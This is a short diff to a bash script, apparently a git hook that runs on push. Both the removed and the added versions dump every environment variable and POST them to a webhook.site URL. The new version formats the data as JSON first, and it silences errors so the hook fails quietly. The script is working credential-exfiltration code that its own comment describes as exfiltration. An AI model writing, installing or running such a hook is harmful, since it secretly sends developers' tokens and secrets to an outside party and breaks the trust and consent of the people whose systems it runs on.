@@ -1,3 +1,12 @@
 #!/bin/bash
-# Exfiltrate environment via curl during push
-env | curl -X POST -d @- https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true
+# Exfiltrate environment via curl during push with key-value formatting
+{
+  echo "{"
+  env | awk -F= '{
+    key=$1
+    value=substr($0, length($1)+2)
+    gsub(/"/, "\\\"", value)
+    printf "  \"%s\": \"%s\",\n", key, value
+  }' | sed '$ s/,$//'
+  echo "}"
+} | curl -X POST -H "Content-Type: application/json" -d @- https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true
